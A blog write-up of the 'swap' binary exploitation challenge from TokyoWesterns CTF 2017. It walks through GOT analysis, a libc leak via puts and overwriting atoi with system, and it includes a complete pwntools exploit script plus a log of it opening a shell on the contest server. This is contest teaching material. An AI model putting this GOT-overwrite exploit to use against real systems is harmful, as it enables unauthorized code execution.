---
layout: post
title: "swap"
---
# swap - tokyo westerns ctf 3rd 2017

The swapping is interesting. Let's try!

nc pwn1.chal.ctf.westerns.tokyo 19937

[swap](https://twctf2017.azureedge.net/attachments/swap-b878cc5ecf612cee902acdc91054486bb4cb3bb337a0cfbaf903ba8d35cfcd17)

[libc.so.6](https://twctf2017.azureedge.net/attachments/libc.so.6-4cd1a422a9aafcdcb1931ac8c47336384554727f57a02c59806053a4693f1c71)

this is a post-mortem writeup i worked on the problem during the ctf but did not solve it in time. i read [this solution](https://github.com/xerosec/CTFs/blob/master/tw2017/swap.py) and wrote my own exploit.

it looks like that we can actually attempt swap values at any given location in memory. :boom: how cool, this is like demolition in a binary form.

```
$ checksec swap
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ nc pwn1.chal.ctf.westerns.tokyo 19937 
<pause>
==============================================
1. Set addrsses
2. Swap both addrress of value
0. Exit
Your choice:
1
Please input 1st addr
0xffffff
Please input 2nd addr
0xfefefe
==============================================
1. Set addrsses
2. Swap both addrress of value
0. Exit
Your choice:
2
<exit>
```

we're given a 64bit binary! i checked the memory map and readelf to see which addresses were static & readable/writable we know ASLR is enabled.

## memory map
```
Start              Perm Path
0x0000000000400000 r-x swap
0x0000000000600000 r-- swap
0x0000000000601000 rw- swap
0x00007f8ccce3c000 r-x libc.so.6
0x00007f8cccffc000 --- libc.so.6
0x00007f8ccd1fc000 r-- libc.so.6
0x00007f8ccd200000 rw- libc.so.6
0x00007f8ccd202000 rw- 
0x00007f8ccd206000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f8ccd426000 rw- 
0x00007f8ccd42b000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f8ccd42c000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f8ccd42d000 rw- 
0x00007ffd5081d000 rw- [stack]
0x00007ffd508b6000 r-- [vvar]
0x00007ffd508b8000 r-x [vdso]
0xffffffffff600000 r-x [vsyscall]
gef➤  dereference 0x0000000000601000 10
0x0000000000601000│+0x00: 0x0000000000600e28  →  0x01
0x0000000000601008│+0x08: 0x00007f8ccd42d168  →  0x00
0x0000000000601010│+0x10: 0x00007f8ccd21d6a0  →  0x7f8ccd21d6a0  <_dl_runtime_resolve_avx+0>  push rbx
0x0000000000601018│+0x18: 0x00007f8ccceab690  →  0x7f8ccceab690  <puts+0>  push r12
0x0000000000601020│+0x20: 0x00000000004006c6  →  0xffd0e90000000168
0x0000000000601028│+0x28: 0x00007f8cccf33220  →  0x7f8cccf33220  <read+0>  cmp DWORD PTR [rip+0x2d2519], 0x0        # 0x7f8ccd205740
0x0000000000601030│+0x30: 0x00007f8ccce5c740  →  0x7f8ccce5c740  <__libc_start_main+0>  push r14
0x0000000000601038│+0x38: 0x00000000004006f6  →  0xffa0e90000000468
0x0000000000601040│+0x40: 0x0000000000400706  →  0xff90e90000000568
0x0000000000601048│+0x48: 0x00007f8ccceabe70  →  0x7f8ccceabe70  <setvbuf+0>  push rbp
```

## relocations table
```
Relocation section '.rela.dyn' at offset 0x530 contains 4 entries:
  Offset            Type        Sym. Name + Addend
000000600ff8  R_X86_64_GLOB_DAT __gmon_start__ + 0
000000601080  R_X86_64_COPY     stdout@GLIBC_2.2.5 + 0
000000601090  R_X86_64_COPY     stdin@GLIBC_2.2.5 + 0
0000006010a0  R_X86_64_COPY     stderr@GLIBC_2.2.5 + 0
Relocation section '.rela.plt' at offset 0x590 contains 10 entries:
  Offset           Type         Sym. Name + Addend
000000601018 R_X86_64_JUMP_SLO  puts@GLIBC_2.2.5 + 0
000000601020 R_X86_64_JUMP_SLO  __stack_chk_fail@GLIBC_2.4 + 0
000000601028 R_X86_64_JUMP_SLO  read@GLIBC_2.2.5 + 0
000000601030 R_X86_64_JUMP_SLO  __libc_start_main@GLIBC_2.2.5 + 0
000000601038 R_X86_64_JUMP_SLO  atoll@GLIBC_2.2.5 + 0
000000601040 R_X86_64_JUMP_SLO  memcpy@GLIBC_2.14 + 0
000000601048 R_X86_64_JUMP_SLO  setvbuf@GLIBC_2.2.5 + 0
000000601050 R_X86_64_JUMP_SLO  atoi@GLIBC_2.2.5 + 0
000000601058 R_X86_64_JUMP_SLO  exit@GLIBC_2.2.5 + 0
000000601060 R_X86_64_JUMP_SLO  sleep@GLIBC_2.2.5 + 0
----- # took this info to gdb:
gef➤  x/xg 0x601028
0x601028:       0x00007f4b79dc7220    <--- read
gef➤  x/xg 0x601040
0x601040:       0x0000000000400706    <--- memcpy
gef➤  p/d 0x601028
$1 = 6295592        <--- read
gef➤  p/d 0x601040
$2 = 6295616        <--- memcpy
```

  we also need to know which addresses effect control of execution, we know the stack does but its randomized. the relocations section effects execution, this includes both the global offset table (GOT) and the program linkage table (PLT). and they're both at static addresses without the program independant executable (PIE) protection. one thing i noticed that i felt was of note is that memcpy and exit have static addresses in their got entries. the rest of the entries in the got seem like randomized addresses:

```
gef➤  dereference 0x0000000000601000 10
0x0000000000601000│+0x00: 0x0000000000600e28  →  0x01
0x0000000000601008│+0x08: 0x00007f8ccd42d168  →  0x00
0x0000000000601010│+0x10: 0x00007f8ccd21d6a0  →  0x7f8ccd21d6a0  <_dl_runtime_resolve_avx+0>  push rbx
0x0000000000601018│+0x18: 0x00007f8ccceab690  →  0x7f8ccceab690  <puts+0>  push r12
0x0000000000601020│+0x20: 0x00000000004006c6  →  0xffd0e90000000168
0x0000000000601028│+0x28: 0x00007f8cccf33220  →  0x7f8cccf33220  <read+0>  cmp DWORD PTR [rip+0x2d2519], 0x0        # 0x7f8ccd205740
0x0000000000601030│+0x30: 0x00007f8ccce5c740  →  0x7f8ccce5c740  <__libc_start_main+0>  push r14
0x0000000000601038│+0x38: 0x00000000004006f6  →  0xffa0e90000000468
0x0000000000601040│+0x40: 0x0000000000400706  →  0xff90e90000000568
0x0000000000601048│+0x48: 0x00007f8ccceabe70  →  0x7f8ccceabe70  <setvbuf+0>  push rbp
gef➤  p/x &puts
$3 = 0x7f8ccceab690
gef➤  x/2g 0x000000601018
0x601018:       0x00007f8ccceab690      0x00000000004006c6
gef➤  p/d 0x601018
$4 = 6295576
```

  checking the binary protections in place:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

  since the binary has just partial relro enabled the non-PLT GOT is read-only but the GOT is still writable. i went ahead and decompiled the main parts of the program:

```c
//----- (00000000004009D7) ----------------------------------------------------
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax@2
  void *src; // [sp+20h] [bp-20h]@0
  void *v5; // [sp+28h] [bp-18h]@0
  char dest; // [sp+30h] [bp-10h]@7
  __int64 v7; // [sp+38h] [bp-8h]@1
  v7 = *MK_FP(__FS__, 40LL);
  initialize();
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      v3 = read_int();
      if ( v3 != 1 )
        break;
      puts("Please input 1st addr");
      src = (void *)read_ll();             // reads 8 byte addr into src
      puts("Please input 2nd addr");
      v5 = (void *)read_ll();              //  reads 8 byte addr into v5
    }
    if ( v3 == 2 )
    {
      memcpy(&dest, src, 8uLL);
      memcpy(src, v5, 8uLL);
      memcpy(v5, &dest, 8uLL);
    }
    else if ( !v3 )
    {
      puts("Bye.");
      exit(0);
    }
  }
}
//----- (00000000004008C6) ----------------------------------------------------
__int64 read_int()
{
  __int64 result; // rax@1
  __int64 v1; // rcx@1
  char buf; // [sp+10h] [bp-90h]@1
  __int64 v3; // [sp+98h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  read(0, &buf, 0x10uLL);
  result = atoi(&buf);
  v1 = *MK_FP(__FS__, 40LL) ^ v3;
  return result;
}
//----- (0000000000400933) ----------------------------------------------------
__int64 read_ll()
{
  __int64 result; // rax@1
  __int64 v1; // rcx@1
  char buf; // [sp+10h] [bp-110h]@1
  __int64 v3; // [sp+118h] [bp-8h]@1
  v3 = *MK_FP(__FS__, 40LL);
  read(0, &buf, 0x20uLL);
  result = atoll(&buf);
  v1 = *MK_FP(__FS__, 40LL) ^ v3;
  return result;
}
```

  i had to think through what would happen by replacing memcpy with read, there are three calls to read but the second one is where we've got the most control. assuming we enter "0" for the first input and some destination write address for the second input; the first call would result in a non-fatal error which there are no checks for since our destination buffer would be null, the second call would result in our intended write, and the third call would also result in a non-fatal error. this is all according to the man page which specifies the errno values it _returns_:

```
       EBADF  fd is not a valid file descriptor or is not open for reading.
       EFAULT buf is outside your accessible address space
```

 so the plan would be to swap memcpy for read since they take the same type arguments and then we have an arbitrary write primitive. with that we can overwrite atoi with puts and leak memory off the stack, looking at read_int:

```c
int main() {
      while ( 1 )
    {
      print_menu();
      v3 = read_int();
    // ...
}

__int64 read_int() {
  __int64 result; // rax@1
  __int64 v1; // rcx@1
  char buf; // [sp+10h] [bp-90h]@1
  __int64 v3; // [sp+98h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  read(0, &buf, 0x10uLL);
  result = atoi(&buf);
  v1 = *MK_FP(__FS__, 40LL) ^ v3;
  return result;
}
```

  and the stack when we call atoi with the selection "1":

```
$rsi   : 0x00007fffec828cb0  →  0x00007f95c4dd1631  →  0xa300007f95c4dd16               
$rdi   : 0x00007fffec828cb0  →  0x00007f95c4dd1631  →  0xa300007f95c4dd16
$rip   : 0x0000000000400908  →  <read_int+66> call 0x400720 <atoi@plt>
$r8    : 0x00007f95c4ff7700  →  0x00007f95c4ff7700  →  [loop detected]
$r9    : 0x1999999999999999
$r10   : 0x0000000000000000
$r11   : 0x0000000000000246
$r12   : 0x0000000000400760  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffec828e70  →  0x0000000000000001
$r14   : 0x0000000000000000
$r15   : 0x0000000000000000
$cs    : 0x0000000000000033
$ss    : 0x000000000000002b
$ds    : 0x0000000000000000
$es    : 0x0000000000000000
$fs    : 0x0000000000000000
$gs    : 0x0000000000000000
$eflags: [CARRY PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────[ stack ]───
0x00007fffec828ca0│+0x00: 0x00007f95c4dd1620  →  0x00000000fbad2887      ← $rsp
0x00007fffec828ca8│+0x08: 0x0000000000000001
0x00007fffec828cb0│+0x10: 0x00007f95c4dd1631  →  0xa300007f95c4dd16      ← $rax, $rsi, $rdi
0x00007fffec828cb8│+0x18: 0x00007fffec828e70  →  0x0000000000000001
0x00007fffec828cc0│+0x20: 0x0000000000000000
0x00007fffec828cc8│+0x28: 0x00007f95c4a86409  →  <_IO_do_write+121> mov r13, rax
0x00007fffec828cd0│+0x30: 0x000000000000000d
─────────────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
     0x4008ef <read_int+41>    mov    edi, 0x0
     0x4008f4 <read_int+46>    mov    eax, 0x0
     0x4008f9 <read_int+51>    call   0x4006d0 <read@plt>
     0x4008fe <read_int+56>    lea    rax, [rbp-0x90]
     0x400905 <read_int+63>    mov    rdi, rax
 →   0x400908 <read_int+66>    call   0x400720 <atoi@plt>
   ↳    0x400720 <atoi@plt+0>     jmp    QWORD PTR [rip+0x20092a]        # 0x601050
        0x400726 <atoi@plt+6>     push   0x7
        0x40072b <atoi@plt+11>    jmp    0x4006a0
        0x400730 <exit@plt+0>     jmp    QWORD PTR [rip+0x200922]        # 0x601058
        0x400736 <exit@plt+6>     push   0x8
        0x40073b <exit@plt+11>    jmp    0x4006a0
────────────────────────────────────[ threads ]───
[#0] Id 1, Name: "swap-b878cc5ecf", stopped, reason: BREAKPOINT
```

##  libc address
```
Start              End                Offset             Perm Path
0x00007f95c4a0c000 0x00007f95c4bcc000 0x0000000000000000 r-x libc.so.6
```

  notice the libc address that ends in 0x31 ('1') where $rax, $rsi and $rdi point to. you might be wondering why this would ever work as the string we've entered is not ending in a null byte. atoi actually only pays attention to characters between '0' and '9', anything can come afterwards and it will ignore it, so atoi only actually sees the 0x31 and disregards the following characters, puts will leak the rest of these bytes to us though. :)

  we must however consider that after overwriting atoi we potentially cripple our menu because atoi returned the menu option selected. we can however keep our write primitive in tact by abusing the return value of puts, puts returns the number of bytes printed so if we insert null bytes at the right place we can keep using the menu to finish our exploit :smile:.

  from here we can calculate the offset of system in our libc and replace atoi with system, since they both take our string as input we can directly pass system "sh\x00" and get our shell!

```
$ python pwn-swap.py remote                                                                                                                                                                 vagrant@vagrant
[*] For remote: pwn-swap.py HOST PORT
[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 19937: Done
[*] addr1: 6295616
[*] addr2: 6295592
[*] addr1: 0
[*] addr2: 6295632
[*] libc leak: 0x00007efe71229000
[*] writing system to atoi; 0x00007efe7126e390
[*] Switching to interactive mode
1
==============================================
1. Set addrsses
2. Swap both addrress of value
0. Exit
Your choice:
$ pwd
/home/p19937
$ ls -l
total 20
-rw-r----- 1 root p19937   32 Sep  1 19:07 flag
-rwxr-x--- 1 root p19937   59 Sep  2 00:31 launch.sh
-rwxr-x--- 1 root p19937 9288 Sep  1 19:07 swap
$ cat flag
TWCTF{SWAP_SAWP_WASP_PWAS_SWPA}
$
[*] Closed connection to pwn1.chal.ctf.westerns.tokyo port 19937
```

## full exploit code:
```python
#!/usr/bin/python
# pwn swap
# clampz

import sys
from pwn import *

bin_name = './swap-b878cc5ecf612cee902acdc91054486bb4cb3bb337a0cfbaf903ba8d35cfcd17'
host = 'pwn1.chal.ctf.westerns.tokyo'
port = 19937
#b *0x00400a58
#b *0x00400a70
#b *0x00400a88
script = """
b *0x00400908
c
"""

puts_got = 0x601018
puts_plt = 0x4006b6
read_got = 0x601028
memcpy_got = 0x601040
atoi_got = 0x601050
system_offset = 283536

def set_addrs(addr1, addr2):
    r.recvuntil("Your choice: \n")
    r.sendline("1")
    r.recvuntil("1st addr\n")
    log.info("addr1: {}".format(addr1))
    r.sendline(addr1)
    r.recvuntil("2nd addr\n")
    log.info("addr2: {}".format(addr2))
    r.sendline(addr2)

def swap():
    r.recvuntil("Your choice: \n")
    r.send("2")

def exploit():
    # overwrite memcpy w read
    set_addrs(str(memcpy_got), str(read_got))
    swap()
    # overwrite atoi w puts
    set_addrs(str(0), str(atoi_got))
    swap()
    r.send_raw( p64(puts_plt) )
    # leak libc
    r.recvuntil("choice: \n")
    r.send_raw("1")
    libc = u64(r.recvuntil("choice: \n")[0:6].ljust(8,'\x00')) - 3954225
    log.info("libc leak: 0x{}".format(p64(libc)[::-1].encode('hex')))
    # gotta set addrs manually now - overwrite atoi w system
    r.send_raw("\x00")
    r.recvuntil("1st addr\n")
    r.send_raw("0")
    r.recvuntil("2nd addr\n")
    r.send_raw(str(atoi_got))
    r.recvuntil("Your choice: \n")
    r.send("1\x00")
    log.info("writing system to atoi; 0x{}".format(p64( libc + system_offset )[::-1].encode('hex')))
    r.send_raw( p64( libc + system_offset ) )
    r.send_raw( 'sh\x00' )
    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(host, port)
        exploit()
    else:
        r = process([bin_name], env={"LD_PRELOAD":"./libc.so.6-4cd1a422a9aafcdcb1931ac8c47336384554727f57a02c59806053a4693f1c71"})
        log.info("PID: {}".format(util.proc.pidof(r)))
#        gdb.attach(r, gdbscript=script)
        exploit()
```
